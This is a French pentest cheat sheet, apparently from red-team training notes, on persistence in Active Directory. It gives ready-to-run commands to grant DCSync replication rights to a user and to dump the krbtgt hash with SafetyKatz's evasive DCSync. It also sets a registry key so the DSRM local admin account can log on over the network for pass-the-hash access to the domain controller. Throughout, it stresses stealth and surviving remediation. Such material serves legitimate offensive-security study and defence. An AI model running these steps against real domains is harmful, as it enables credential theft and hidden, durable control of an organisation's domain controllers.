# Cheatsheet - Persistence

> [!summary] Objectif
> Persistance spécifique AD : DCSync (extraire n'importe quel hash à volonté) et l'administrateur DSRM du DC (compte local du DC, indépendant d'un reset de mot de passe de domaine).

### DCSync — droits de réplication

> Une fois le droit posé, permet d'extraire à volonté le hash de *n'importe quel* compte du domaine (dont `krbtgt`, la clé pour forger des Golden Tickets) sans jamais se connecter au DC ni laisser de trace de dump local — un accès credential-on-demand qui survit à la plupart des remédiations ponctuelles.

> [!warning]- Required
> Les droits de réplication (`DS-Replication-Get-Changes[-All]`) — déjà présents sur certains comptes de service, ou à ajouter soi-même depuis un accès DA déjà obtenu (voir [[Cheatsheet - Tickets Kerberos]]).

```powershell
Get-DomainObjectAcl -SearchBase "DC=<DOMAIN>,DC=local" -SearchScope Base -ResolveGUIDs |
  ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} |
  ?{$_.IdentityName -match "<USER>"}
# si absent, l'ajouter depuis un contexte DA :
Add-DomainObjectAcl -TargetIdentity 'DC=<DOMAIN>,DC=local' -PrincipalIdentity <USER> -Rights DCSync
# puis extraire :
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:<DOMAIN>\krbtgt" "exit"
```

Une fois le droit `DS-Replication-Get-Changes(-All)` posé sur un user compromis, la persistance est quasi invisible : plus besoin de retoucher le DC pour ré-extraire un hash.

### DSRM — administrateur local du DC

> Donne un accès admin complet au DC via un compte *local* (mode restauration), totalement indépendant du domaine — ce chemin survit à un reset du mot de passe de n'importe quel compte de domaine (y compris `Administrator` et `krbtgt`), contrairement aux Golden/Diamond tickets qui, eux, meurent avec `krbtgt`.

> [!warning]- Required
> Privilèges Domain Admin déjà obtenus (pour élever à SYSTEM sur le DC et dumper le SAM) — voir [[Cheatsheet - Tickets Kerberos]] / [[Cheatsheet - Lateral movement]] pour y arriver.

```cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

Autorise le compte DSRM (hash extrait via `lsadump::evasive-sam` après élévation SYSTEM) à se connecter par le réseau. Ensuite Pass-the-Hash (pas OverPass) avec ce hash NTLM local → accès DC indépendant du domaine.

> [!note] Golden/Diamond ticket sont aussi des mécanismes de persistance (clé `krbtgt`) — détaillés dans [[Cheatsheet - Tickets Kerberos]].

### Repères génériques Windows (secondaire)

```powershell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

**Link**
- [[Cheatsheet - Tickets Kerberos]]
- [[Cheatsheet - Post-exploitation]]
- [[Cheatsheet - Privilege escalation]]
